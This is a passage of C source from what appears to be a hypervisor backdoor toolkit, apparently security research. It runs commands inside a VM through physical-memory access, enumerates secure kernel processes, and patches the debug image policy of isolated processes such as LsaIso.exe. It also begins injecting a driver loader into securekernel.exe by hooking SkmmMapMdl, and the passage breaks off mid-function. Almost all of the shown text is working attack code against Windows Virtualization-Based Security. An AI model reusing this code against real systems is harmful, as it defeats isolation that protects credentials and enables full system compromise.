    printf("[+] VM_EXEC_STRUCT physical address is 0x%.16llx\n", info_addr);

    // read VM_EXEC_STRUCT
    if (backdoor_phys_read(info_addr, &exec_struct, sizeof(exec_struct)) != 0)
    {
        return -1;
    }

    // sanity check
    if (exec_struct.control != VM_EXEC_CTL_READY && exec_struct.control != VM_EXEC_CTL_DONE &&
        exec_struct.control != VM_EXEC_CTL_ERROR && exec_struct.control != VM_EXEC_CTL_TIMEOUT)
    {
        printf("ERROR: Bogus VM_EXEC_STRUCT\n");
        return -1;
    }

    // set up command
    exec_struct.control = VM_EXEC_CTL_READY;
    strcpy(exec_struct.command, command);

    // write command
    if (backdoor_phys_write(info_addr, &exec_struct, sizeof(exec_struct)) != 0)
    {
        return -1;
    }

    // notify that command is ready to execute
    exec_struct.control = VM_EXEC_CTL_RUNING;

    // write control
    if (backdoor_phys_write(info_addr, &exec_struct, sizeof(exec_struct) - VM_EXEC_MAX_COMMAND_LEN) != 0)
    {
        return -1;
    }

    while (true)
    {
        // read control
        if (backdoor_phys_read(info_addr, &exec_struct, sizeof(exec_struct) - VM_EXEC_MAX_COMMAND_LEN) != 0)
        {
            return -1;
        }

        // check if command was exxcuted
        if (exec_struct.control != VM_EXEC_CTL_RUNING)
        {
            if (exec_struct.control == VM_EXEC_CTL_ERROR)
            {
                printf("ERROR: Unknown failure while executing command\n");
                return -1;
            }
            else if (exec_struct.control == VM_EXEC_CTL_TIMEOUT)
            {
                printf("ERROR: Command execution timeout occurred\n");
                return -1;
            }

            // success
            break;
        }

        bd_sleep(1000);
    }

    // sanity check
    if (exec_struct.output == NULL || exec_struct.output_size == 0)
    {
        printf("ERROR: Command output is not available\n");
        return -1;
    }

    printf("[+] Command output address is %p (%d bytes)\n", exec_struct.output, exec_struct.output_size);

    // allocate memory for command output
    char *output = (char *)malloc(exec_struct.output_size);
    if (output == NULL)
    {
        return -1;
    }

    memset(output, 0, exec_struct.output_size);

    for (uint32_t ptr = 0; ptr < exec_struct.output_size; ptr += PAGE_SIZE)
    {
        uint64_t phys_addr = 0;

        m_quiet = true;

        // get host physical address of the command output memory page
        if (backdoor_virt_translate((uint64_t)exec_struct.output + ptr, &phys_addr, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            goto _end;
        }

        m_quiet = false;

        // read command output memory page
        if (backdoor_phys_read(phys_addr, output + ptr, PAGE_SIZE) != 0)
        {
            goto _end;
        }
    }    

    // print command output into the console
    printf("\n%s\n", output);
    ret = 0;

_end:

    free(output);

    return ret;
}
//--------------------------------------------------------------------------------------
typedef int (* sk_process_callback)(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx);

uint32_t sk_process_flags = 0;
uint32_t sk_process_pid = 0;
uint32_t sk_process_cr3 = 0;
uint32_t sk_process_list = 0;
uint32_t sk_process_policy = 0;

typedef struct _DEBUG_ENABLE_CTX
{
    uint32_t pid;
    uint64_t enable;
    bool found;

} DEBUG_ENABLE_CTX;

int sk_process_read_64(SK_INFO *sk_info, uint64_t addr_virt, uint64_t *val)
{
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t addr_phys = 0;

    m_quiet = true;

    // get physical address
    if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) != 0)
    {
        m_quiet = false;
        return -1;
    }

    m_quiet = false;

    // read memory
    return backdoor_phys_read_64(addr_phys, val);
}

int sk_process_read_32(SK_INFO *sk_info, uint64_t addr_virt, uint32_t *val)
{
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t addr_phys = 0;

    m_quiet = true;

    // get physical address
    if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) != 0)
    {
        m_quiet = false;
        return -1;
    }

    m_quiet = false;

    // read memory
    return backdoor_phys_read_32(addr_phys, val);
}

int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx)
{
    DEBUG_ENABLE_CTX *debug_enable = (DEBUG_ENABLE_CTX *)ctx;
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t ps_cr3 = 0, ps_policy = 0;
    uint32_t ps_pid = 0;

    // read process information
    if (sk_process_read_32(sk_info, process_addr_virt + sk_process_pid, &ps_pid) != 0 ||
        sk_process_read_64(sk_info, process_addr_virt + sk_process_cr3, &ps_cr3) != 0 ||
        sk_process_read_64(sk_info, process_addr_virt + sk_process_policy, &ps_policy) != 0)
    {
        return -1;
    }

    if (debug_enable->pid != ps_pid)
    {
        return 0;
    }

    debug_enable->found = true;

    printf("[+] SKPROCESS for PID %d is at 0x%llx\n", ps_pid, process_addr_virt);
    printf("[+] Image policy is at 0x%llx\n", ps_policy);
    
    uint64_t policy_addr = ps_policy & ~(PAGE_SIZE - 1), policy_addr_phys = 0;
    uint64_t policy_offs = ps_policy & (PAGE_SIZE - 1);

    /*
        Image policy memory page might be paged out.

        Here we calling DebugActiveProcess() function which triggers
        secure kernel SkpsIsProcessDebuggingEnabled() -> SkpspFindPolicy()
        which loads image policy from swap.
    */
    if (DebugActiveProcess((DWORD)ps_pid))
    {
        DebugActiveProcessStop((DWORD)ps_pid);
    }

    m_quiet = true;

    // get physical address of process image policy
    if (backdoor_virt_translate(policy_addr, &policy_addr_phys, ps_cr3, ept_addr) != 0)
    {
        m_quiet = false;
        return 0;
    }

    m_quiet = false;

    uint8_t *policy = (uint8_t *)malloc(PAGE_SIZE);
    if (policy)
    {
        IMAGE_POLICY_METADATA *policy_hdr = (IMAGE_POLICY_METADATA *)(policy + policy_offs);

        // read process image policy
        if (backdoor_phys_read(policy_addr_phys, policy, PAGE_SIZE) != 0)
        {
            return -1;
        }

        if (policy_hdr->Version == IMAGE_POLICY_METADATA_VERSION)
        {
            bool policy_found = false;
            IMAGE_POLICY_ENTRY *policy_ent = (IMAGE_POLICY_ENTRY *)&policy_hdr->Policies;

            // find debug enable image policy entry
            while (true)
            {
                char *policy_name = NULL;

                if (policy_ent->PolicyId == ImagePolicyEntryTypeNone)
                {
                    // end of the list
                    break;
                }

                if (policy_ent->PolicyId == ImagePolicyIdDebug)
                {
                    printf("[+] ImagePolicyIdDebug found, current value is %llx\n", policy_ent->u.Int64Value);

                    // update policy entry
                    policy_ent->u.Int64Value = debug_enable->enable;
                    policy_found = true;
                    break;
                }                

                policy_ent += 1;
            }

            if (policy_found)
            {
                // overwrite original image policy
                if (backdoor_phys_write(policy_addr_phys, policy, PAGE_SIZE) == 0)
                {
                    printf("[+] Image policy was successfully patched\n");
                }
            }
            else
            {
                printf("ERROR: Unable to find ImagePolicyIdDebug entry\n");
            }
        }

        free(policy);
    }
 
    return -1;
}

int sk_process_print(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx)
{
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t ps_flags = 0, ps_cr3 = 0, ps_policy = 0;
    uint32_t ps_pid = 0;
    char ps_name[MAX_PATH] = "<unknown>";

    // read process information
    if (sk_process_read_64(sk_info, process_addr_virt + sk_process_flags, &ps_flags) != 0 ||
        sk_process_read_32(sk_info, process_addr_virt + sk_process_pid, &ps_pid) != 0 ||
        sk_process_read_64(sk_info, process_addr_virt + sk_process_cr3, &ps_cr3) != 0 ||
        sk_process_read_64(sk_info, process_addr_virt + sk_process_policy, &ps_policy) != 0)
    {
        return -1;
    }

    process_name_by_id(ps_pid, ps_name, MAX_PATH - 1);

    printf("\n SKPROCESS at 0x%llx \"%s\"\n\n", process_addr_virt, ps_name);
    printf("       flags: 0x%llx\n", ps_flags);
    printf("         PID: %d\n", ps_pid);
    printf("         CR3: 0x%llx\n", ps_cr3);
    printf("      policy: 0x%.16llx\n\n", ps_policy);

    uint64_t policy_addr = ps_policy & ~(PAGE_SIZE - 1), policy_addr_phys = 0;
    uint64_t policy_offs = ps_policy & (PAGE_SIZE - 1);

    /*
        Image policy memory page might be paged out.

        Here we calling DebugActiveProcess() function which triggers
        secure kernel SkpsIsProcessDebuggingEnabled() -> SkpspFindPolicy()
        which loads image policy from swap.
    */
    if (DebugActiveProcess((DWORD)ps_pid))
    {
        DebugActiveProcessStop((DWORD)ps_pid);
    }

    m_quiet = true;

    // get physical address of process image policy
    if (backdoor_virt_translate(policy_addr, &policy_addr_phys, ps_cr3, ept_addr) != 0)
    {
        m_quiet = false;
        return 0;
    }

    m_quiet = false;

    uint8_t *policy = (uint8_t *)malloc(PAGE_SIZE);
    if (policy)
    {
        IMAGE_POLICY_METADATA *policy_hdr = (IMAGE_POLICY_METADATA *)(policy + policy_offs);

        // read process image policy
        if (backdoor_phys_read(policy_addr_phys, policy, PAGE_SIZE) != 0)
        {
            return -1;
        }

        if (policy_hdr->Version == IMAGE_POLICY_METADATA_VERSION)
        {
            IMAGE_POLICY_ENTRY *policy_ent = (IMAGE_POLICY_ENTRY *)&policy_hdr->Policies;

            while (true)
            {
                char *policy_name = NULL;

                if (policy_ent->PolicyId == ImagePolicyEntryTypeNone)
                {
                    // end of the list
                    break;
                }

                switch (policy_ent->PolicyId)
                {
                case ImagePolicyIdEtw:

                    policy_name = "ImagePolicyIdEtw";
                    break;

                case ImagePolicyIdDebug:

                    policy_name = "ImagePolicyIdDebug";
                    break;

                case ImagePolicyIdCrashDump:

                    policy_name = "ImagePolicyIdCrashDump";
                    break;

                case ImagePolicyIdCrashDumpKey:

                    policy_name = "ImagePolicyIdCrashDumpKey";
                    break;

                case ImagePolicyIdCrashDumpKeyGuid:

                    policy_name = "ImagePolicyIdCrashDumpKeyGuid";
                    break;

                case ImagePolicyIdParentSd:

                    policy_name = "ImagePolicyIdParentSd";
                    break;

                case ImagePolicyIdParentSdRev:

                    policy_name = "ImagePolicyIdParentSdRev";
                    break;

                case ImagePolicyIdSvn:

                    policy_name = "ImagePolicyIdSvn";
                    break;

                case ImagePolicyIdDeviceId:

                    policy_name = "ImagePolicyIdDeviceId";
                    break;

                case ImagePolicyIdCapability:

                    policy_name = "ImagePolicyIdCapability";
                    break;

                case ImagePolicyIdScenarioId:

                    policy_name = "ImagePolicyIdScenarioId";
                    break;
                }

                if (policy_name)
                {
                    printf("    %s = 0x%llx\n", policy_name, policy_ent->u.UInt64Value);
                }

                policy_ent += 1;
            }            
        }

        free(policy);
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process_callback callback, void *ctx)
{
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t sk_process_list_virt = 0, sk_process_list_phys = 0;
    uint64_t sk_addr_phys = 0;
    uint32_t sk_size = 0, build = 0;

    m_quiet = true;

    // get securekernel physical address
    if (backdoor_virt_translate(sk_addr_virt, &sk_addr_phys, pml4_addr, ept_addr) != 0)
    {
        printf("ERROR: Unable to get securekernel.exe physical address\n");
    }

    m_quiet = false;

    if (sk_addr_phys == 0)
    {
        return -1;
    }

    printf("[+] Secure world EPT is at 0x%.16llx\n", ept_addr);
    printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);    

    uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
    if (buff)
    {
        IMAGE_NT_HEADERS *hdr = NULL;

        // read securekernel image headers
        if (backdoor_phys_read(sk_addr_phys, buff, PAGE_SIZE) == 0)
        {
            IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)buff;
            if (dos_hdr->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
            {
                IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)RVATOVA(buff, dos_hdr->e_lfanew);

                // get image size
                sk_size = hdr->OptionalHeader.SizeOfImage;

                printf("[+] securekernel.exe image size is 0x%x bytes\n", sk_size);
            }
            else
            {
                printf("ERROR: Bad securekernel.exe image header\n");
            }
        }        

        free(buff);
    }

    if (sk_size == 0)
    {
        return -1;
    }

    // allocate memory for secure kernel image
    uint8_t *image = (uint8_t *)malloc(sk_size);
    if (image)
    {
        uint32_t ptr = 0;
        uint64_t addr_virt = sk_addr_virt, addr_phys = 0;

        memset(image, 0, sk_size);

        m_quiet = true;

        while (ptr < sk_size)
        {
            if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) == 0)
            {
                // dump memory page
                backdoor_phys_read(addr_phys, image + ptr, PAGE_SIZE);
            }

            ptr += PAGE_SIZE;
            addr_virt += PAGE_SIZE;
        }

        m_quiet = false;        

        IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)image;
        IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)RVATOVA(image, dos_hdr->e_lfanew);

        IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)RVATOVA(
            &hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

        uint32_t text_addr = 0, text_size = 0;

        for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
        {
            // find code section
            if (!strncmp((char *)&sec->Name, ".text", 5))
            {
                text_addr = sec->VirtualAddress;
                text_size = sec->Misc.VirtualSize;
                break;
            }

            sec += 1;
        }

        if (text_addr != 0)
        {
            for (uint32_t i = 0; i < text_size; i += 1)
            {
                uint8_t *p = image + text_addr + i;
                bool matched = false;

                /*
                    Match securekernel!SkpsInitializeProcess() signature:

                        .text:0000000140003DA1      lea     r8, SkpspProcessList
                        .text:0000000140003DA8      lea     rcx, [rdi+0B0h]
                        .text:0000000140003DAF      cmp     [rdx], r8
                        .text:0000000140003DB2      jnz     loc_140046B73                        
                */
                if ((*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
                     *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
                     *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                     *(p + 0x11) == 0x0f && *(p + 0x12) == 0x85) ||
                /*
                    Windows 10 1809 and earlier variation:

                        .text:000000014004BA0F      lea     rax, SkpspProcessList
                        .text:000000014004BA16      add     rcx, 0B0h
                        .text:000000014004BA1D      cmp     [rdx], rax
                        .text:000000014004BA20      jz      short loc_14004BA29
                */
                     (*(p + 0x00) == 0x48 && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
                      *(p + 0x07) == 0x48 && *(p + 0x08) == 0x81 && *(p + 0x09) == 0xc1 &&
                      *(p + 0x0e) == 0x48 && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                      *(p + 0x11) == 0x74))
                {
                    sk_process_flags    = 0x0000;
                    sk_process_pid      = 0x0030;
                    sk_process_cr3      = 0x0038;
                    sk_process_list     = 0x00b0;
                    sk_process_policy   = 0x0158;

                    matched = true;
                }
                /*
                    Windows 10 2004 and later variation:

                        .text:000000014002C39E      lea     r8, SkpsProcessList
                        .text:000000014002C3A5      lea     rcx, [rdi+0C8h]
                        .text:000000014002C3AC      cmp     [rdx], r8
                        .text:000000014002C3AF      jz      short loc_14002C3B8
                */
                else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
                         *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                         *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
                {
                    sk_process_flags    = 0x0000;
                    sk_process_pid      = 0x0030;
                    sk_process_cr3      = 0x0038;
                    sk_process_list     = 0x00c8;
                    sk_process_policy   = 0x0168;

                    matched = true;
                }

                if (matched)
                {
                    // get operand displacement
                    int32_t disp = *(int32_t *)(p + 3) + 7;

                    // calculate operand address
                    sk_process_list_virt = (uint64_t)((int64_t)sk_addr_virt + text_addr + i + disp);

                    m_quiet = true;

                    // get physical address
                    backdoor_virt_translate(sk_process_list_virt, &sk_process_list_phys, pml4_addr, ept_addr);

                    m_quiet = false;

                    break;
                }
            }            
        }
        else
        {
            printf("ERROR: Unable to find securekernel.exe code section\n");
        }

        uint32_t rva = LdrGetProcAddress(image, "RtlGetVersion");
        if (rva != 0)
        {
            uint8_t *p = image + rva;

            /*
                Match securekernel!RtlGetVersion() signature:

                    .text:0000000140089410      mov     edx, [rcx]
                    .text:0000000140089412      xor     r9d, r9d
                    .text:0000000140089415      mov     qword ptr [rcx+4], 0Ah
                    .text:000000014008941D      mov     dword ptr [rcx+0Ch], 271Bh
                    .text:0000000140089424      mov     dword ptr [rcx+10h], 2
            */
            if (*(p + 0x05) == 0x48 && *(p + 0x06) == 0xc7 && *(p + 0x07) == 0x41 && *(p + 0x08) == 0x04 &&
                *(p + 0x0d) == 0xc7 && *(p + 0x0e) == 0x41 && *(p + 0x0f) == 0x0c)
            {
                // get build number
                build = *(uint32_t *)(p + 0x10);
            }
        }
        else
        {
            printf("ERROR: Unable to find securekernel!RtlGetVersion()\n");
        }

        free(image);
    }

    if (build == 0)
    {
        printf("ERROR: Unable to find secure kernel build number\n");
        return -1;
    }    

    if (sk_process_list_virt == 0 || sk_process_list_phys == 0)
    {
        printf("ERROR: Unable to find securekernel!SkpspProcessList\n");
        return -1;
    }

    printf("[+] Secure kernel build number is %d\n", build);
    printf("[+] securekernel!SkpspProcessList is at 0x%llx\n", sk_process_list_virt);    

    if (build != 10011)
    {
        printf("ERROR: Unsupported secure kernel build number\n");
        return -1;
    }            

    uint64_t head = sk_process_list_virt, entry_virt = 0;

    // read process list forward link
    if (backdoor_phys_read_64(sk_process_list_phys, &entry_virt) != 0)
    {
        return -1;
    }

    // walk over the double linked list
    while (entry_virt != head)
    {
        uint64_t entry_phys = 0;        

        m_quiet = true;

        // get physical address of the list entry
        if (backdoor_virt_translate(entry_virt, &entry_phys, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;
            return -1;
        }

        m_quiet = false;  

        if (callback)
        {
            if (callback(sk_info, entry_virt - sk_process_list, ctx) != 0)
            {
                // stop enumeration
                break;
            }
        }

        // read process list entry
        if (backdoor_phys_read_64(entry_phys, &entry_virt) != 0)
        {
            return -1;
        }
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_sk_trigger(void)
{
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;
    char path[MAX_PATH];

    ZeroMemory(&process_info, sizeof(process_info));
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);

    GetSystemDirectory(path, MAX_PATH);
    strcat(path, "\\LsaIso.exe");

    // create secure process
    if (CreateProcess(
        path, NULL, NULL, NULL, FALSE, CREATE_SECURE_PROCESS,
        NULL, NULL, &startup_info, &process_info))
    {
        if (WaitForSingleObject(process_info.hProcess, 1000) == WAIT_TIMEOUT)
        {
            // force process exit
            TerminateProcess(process_info.hProcess, 0);
        }

        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);

        return 0;
    }

    return -1;
}

int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
{
    int ret = -1;
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
    uint64_t phys_addr = 0, current_pml4_addr = 0, current_ept_addr = 0;
    uint8_t *data = NULL;

    // check if we can run secure processes
    if (backdoor_sk_trigger() != 0)
    {
        printf("ERROR: backdoor_sk_trigger() failed\n");
        return -1;
    }

    // read current cr3 value
    if (backdoor_vmread(GUEST_CR3, &current_pml4_addr) != 0)
    {
        return -1;
    }

    // read current EPT address
    if (backdoor_ept_addr(&current_ept_addr) != 0)
    {
        return -1;
    }

    printf("[+] Current CR3 value is 0x%.16llx\n", current_pml4_addr);
    printf("[+] Current EPT address is 0x%.16llx\n", current_ept_addr);

    int loader_size = sizeof(driver_loader_sk_sys);
    uint8_t *loader = driver_loader_sk_sys;    

    // do some basic sanity checks of the loader image
    if (check_loader_image(loader, loader_size) != 0)
    {
        return -1;
    }

    uint32_t payload_mem_size = _ALIGN_UP(payload_size, PAGE_SIZE); 
    uint8_t *payload_mem = NULL;

    uint32_t loader_mem_size = _ALIGN_UP(loader_size, PAGE_SIZE);
    uint8_t *loader_mem = NULL;

    if (payload)
    {
        // allocate memory for the payload
        if ((payload_mem = (uint8_t *)VirtualAlloc(NULL, payload_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
        {
            printf("VirtualAlloc() ERROR %d\n", GetLastError());
            return -1;
        }

        memcpy(payload_mem, payload, payload_size);
    }    

    // allocate memory for the loader
    if ((loader_mem = (uint8_t *)VirtualAlloc(NULL, loader_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
    {
        printf("VirtualAlloc() ERROR %d\n", GetLastError());
        return -1;
    }

    memcpy(loader_mem, loader, loader_size);    

    if ((data = (uint8_t *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    m_quiet = true;

    uint64_t sk_addr_phys = 0;

    // get securekernel physical address
    if (backdoor_virt_translate(sk_addr_virt, &sk_addr_phys, pml4_addr, ept_addr) != 0)
    {
        printf("ERROR: unable to get securekernel.exe physical address\n");
    }

    m_quiet = false;

    if (sk_addr_phys == 0)
    {
        return -1;
    }

    printf("[+] Secure world EPT is at 0x%.16llx\n", ept_addr);
    printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);

    uint32_t sk_rdata_addr = 0, sk_rdata_size = 0;
    uint32_t sk_text_addr = 0, sk_text_size = 0;
    uint32_t sk_size = 0, sk_sec_align = 0;

    uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
    if (buff)
    {
        IMAGE_NT_HEADERS *hdr = NULL;

        // read securekernel image headers
        if (backdoor_phys_read(sk_addr_phys, buff, PAGE_SIZE) == 0)
        {
            IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)buff;
            if (dos_hdr->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
            {
                IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)RVATOVA(buff, dos_hdr->e_lfanew);

                // get image information
                sk_size = hdr->OptionalHeader.SizeOfImage;
                sk_sec_align = hdr->OptionalHeader.SectionAlignment;

                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec->Name, ".text", 5))
                    {
                        sk_text_addr = sec->VirtualAddress;
                        sk_text_size = sec->Misc.VirtualSize;
                    }
                    else if (!strncmp((char *)&sec->Name, ".rdata", 6))
                    {
                        sk_rdata_addr = sec->VirtualAddress;
                        sk_rdata_size = sec->Misc.VirtualSize;
                    }

                    sec += 1;
                }

                if (sk_text_size == 0 || sk_rdata_size == 0)
                {
                    printf("ERROR: Unable to find needed secure kernel image sections\n");
                }
            }
            else
            {
                printf("ERROR: Bad securekernel.exe image header\n");
            }
        }

        free(buff);
    }

    if (sk_text_size == 0 || sk_rdata_size == 0)
    {
        goto _end;
    }

    uint32_t sk_text_max_size  = _ALIGN_UP(sk_text_size, sk_sec_align);
    uint64_t sk_func_virt = 0, sk_func_phys = 0;

    // check if we have enough of free space at the end of the code section
    if (sk_text_max_size - sk_text_size < JUMP_SIZE_2)
    {
        printf("ERROR: Not enough of free space at the end of the code section\n");
        goto _end;
    }

    sk_size = _ALIGN_UP(sk_size, PAGE_SIZE);

    void *sk_image = malloc(sk_size);
    if (sk_image)
    {
        uint32_t rva = 0;

        memset(sk_image, 0, sk_size);

        for (uint32_t i = 0; i < sk_size; i += PAGE_SIZE)
        {
            if (i == 0 || (i >= sk_rdata_addr && i < sk_rdata_addr + sk_rdata_size))
            {
                m_quiet = true;    

                if (backdoor_virt_translate(sk_addr_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
                {
                    m_quiet = false;
                    continue;
                }

                m_quiet = false;

                if (backdoor_phys_read(phys_addr, (uint8_t *)sk_image + i, PAGE_SIZE) != 0)
                {
                    free(sk_image);
                    goto _end;
                }
            }                
        }

        if ((rva = LdrGetProcAddress(sk_image, "SkmmMapMdl")) != 0)
        {
            // get securekernel!SkmmMapMdl() virtual address
            sk_func_virt = sk_addr_virt + rva;
            m_quiet = true;

            // get securekernel!SkmmMapMdl() physical address
            backdoor_virt_translate(sk_func_virt, &sk_func_phys, pml4_addr, ept_addr);

            m_quiet = false;
        }
        else
        {
            printf("ERROR: Unable to locate nt!SkmmMapMdl()\n");
        }        

        free(sk_image);

        if (sk_func_phys == 0)
        {
            goto _end;
        }
    }
    else
    {
        goto _end;
    }    

    printf("[+] nt!SkmmMapMdl() is at 0x%llx (physical: 0x%llx)\n", sk_func_virt, sk_func_phys);               

    uint64_t driver_base_virt = LOADER_BASE_SK;

    uint32_t driver_m_Params = 0;
    uint32_t driver_new_func = 0;
    uint32_t driver_old_func = 0;

    uint32_t sk_func_saved_size = 0;
    uint64_t info_addr = 0, image_addr = 0;
    uint8_t sk_func_buff[DRIVER_HOOK_SIZE_MAX];    

    printf("[+] Driver loader virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, loader_mem_size);

    // check if needed virtual memory range is free
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {
        uint64_t pte_addr = 0, pte = 0;
        HVBD_PTE_SIZE pte_size;

        m_quiet = true;        

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            printf("ERROR: Unable to get PTE address for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        m_quiet = false;

        if (pte_size != HVBD_PTE_SIZE_4K)
        {
            printf("ERROR: Unexpected page size for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        // read page table entry contents
        if (backdoor_phys_read_64(pte_addr, &pte) != 0)
        {
            goto _end;
        }

        if (pte != 0)
        {
            printf("ERROR: Unexpected PTE for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }        
    }

    uint64_t addr_jump_1_virt = sk_func_virt - JUMP_SIZE_1;
    uint64_t addr_jump_2_virt = sk_addr_virt + sk_text_addr + sk_text_size;
    uint64_t addr_jump_1_phys = 0, addr_jump_2_phys = 0;

    uint8_t buff_jump_1[JUMP_SIZE_1], buff_jump_2[JUMP_SIZE_2];
    uint8_t data_jump_1[JUMP_SIZE_1], data_jump_2[JUMP_SIZE_2];

    memset(data_jump_1, 0xcc, sizeof(data_jump_1));
    memset(data_jump_2, 0x00, sizeof(data_jump_2));

    m_quiet = true;

    // get 2-nd and 3-rd jumps physical address
    backdoor_virt_translate(addr_jump_1_virt, &addr_jump_1_phys, pml4_addr, ept_addr);
    backdoor_virt_translate(addr_jump_2_virt, &addr_jump_2_phys, pml4_addr, ept_addr);

    m_quiet = false;

    if (addr_jump_1_phys == 0 || addr_jump_2_phys == 0)
    {
        goto _end;
    }

    if (backdoor_phys_read(addr_jump_1_phys, data, JUMP_SIZE_1) != 0)
    {
        goto _end;
    }

    // sanity check
    if (memcmp(data_jump_1, data, JUMP_SIZE_1) != 0)
    {
        printf("ERROR: Can't allocate 2-nd jump\n");
        goto _end;
    }

    if (backdoor_phys_read(addr_jump_2_phys, data, JUMP_SIZE_2) != 0)
    {
        goto _end;
    }

    // sanity check
    if (memcmp(data_jump_2, data, JUMP_SIZE_2) != 0)
    {
        printf("ERROR: Can't allocate 3-rd jump\n");
        goto _end;
    }

    /*
        We're using HVBD_DATA structure field as temporary hypervisor memory area
        to store kernel kernel driver load flag (see backdoor_driver.cpp)
    */
    if (backdoor_ept_info_addr(&info_addr) != 0)
    {
        goto _end;
    }

    if (backdoor_virt_write_32(info_addr + DRIVER_SK_INFO_COUNT, 0) != 0)
    {
        goto _end;
    }

    if (backdoor_virt_write_64(info_addr + DRIVER_SK_INFO_ADDR, 0) != 0)
    {
        goto _end;
    }    

    if (!LdrProcessRelocs(loader_mem, (void *)driver_base_virt))
    {
        printf("ERROR: Unable to relocate driver loader image\n");
        goto _end;
    }

    driver_m_Params = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_SK_ORD_PARAMS));
    driver_new_func = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_SK_ORD_HANDLER));
    driver_old_func = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_SK_ORD_CALLGATE));

    if (driver_m_Params == 0 || driver_new_func == 0 || driver_old_func == 0)
    {
        printf("ERROR: Unable to locate needed driver image exports\n");
        goto _end;   
    }      

    DRIVER_SK_PARAMS loader_params;

    // set up driver parameters
    loader_params.kernel_base = (void *)sk_addr_virt;
    loader_params.driver_base = (void *)driver_base_virt;
    loader_params.payload_base = payload_mem;
    loader_params.payload_pages_count = payload_mem_size / PAGE_SIZE;
    loader_params.payload_ept = current_ept_addr;    
    loader_params.payload_pml4 = current_pml4_addr;

    // copy driver parameters
    memcpy(loader_mem + driver_m_Params, &loader_params, sizeof(loader_params));

    // save old code of kernel function to hook
    if (backdoor_phys_read(sk_func_phys, sk_func_buff, DRIVER_HOOK_SIZE_MAX) != 0)
    {
        goto _end;      
    }

    // initialize disassembler engine
    ud_t ud_obj;
    ud_init(&ud_obj);

    // set mode, syntax and vendor
    ud_set_mode(&ud_obj, 64);
    ud_set_vendor(&ud_obj, UD_VENDOR_INTEL);

    uint32_t inst_ptr = 0;

    while (sk_func_saved_size < JUMP_SIZE_0)
    {
        ud_set_input_buffer(&ud_obj, sk_func_buff + inst_ptr, DRIVER_HOOK_SIZE_MAX - inst_ptr);

        // get length of instruction
